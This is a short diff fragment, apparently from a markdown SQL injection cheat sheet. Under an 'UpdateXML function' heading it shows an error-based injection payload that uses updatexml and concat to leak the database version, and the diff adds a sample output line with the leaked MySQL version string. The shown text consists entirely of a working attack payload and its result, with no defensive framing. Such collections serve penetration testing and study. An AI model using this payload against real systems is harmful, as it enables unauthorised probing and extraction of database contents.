@@ -76,3 +76,6 @@ Continue
 ### UpdateXML function
 
 `AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--`
+
+OUTPUT: Error While Selection process : XPATH syntax error: '~5.6.44-cll-lve~'
+
